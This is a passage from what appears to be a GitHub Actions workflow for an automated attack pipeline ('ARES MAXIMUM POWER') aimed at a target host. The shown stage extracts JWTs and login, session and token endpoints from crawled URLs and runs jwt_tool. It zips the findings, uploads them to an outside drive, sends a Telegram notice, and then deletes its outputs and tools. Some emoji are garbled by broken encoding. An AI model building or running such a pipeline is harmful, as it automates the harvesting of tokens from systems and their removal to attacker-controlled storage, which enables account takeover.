          grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" output/crawl/all_urls.txt 2>/dev/null | sort -u > output/specialized/found_jwts.txt || true
          grep -iE "login|signin|auth|password|register|session|token" output/crawl/all_urls.txt > output/auth/endpoints.txt 2>/dev/null || true
          echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > output/specialized/sample.jwt
          jwt_tool $(cat output/specialized/sample.jwt) > output/specialized/jwt_tool.txt 2>&1 || true
          zip -r auth.zip output/auth/ output/specialized/
          python3 drive_upload.py auth.zip Stage_20_Auth
        '
        echo ""
        echo "=========================================="
        echo "ðŸ ARES MAXIMUM POWER COMPLETED"
        echo "=========================================="
        tg "ðŸ *ARES MAXIMUM POWER* completed on \`$TARGET\` - 20 stages"
    - name: Cleanup
      if: always()
      run: |
        rm -rf output/ *.zip drive_upload.py test.tf 2>/dev/null || true
        rm -rf $HOME/tools/ $HOME/SecLists/ $HOME/.jaeles/ $HOME/.gf/ 2>/dev/null || true
        echo "âœ… Cleanup complete"
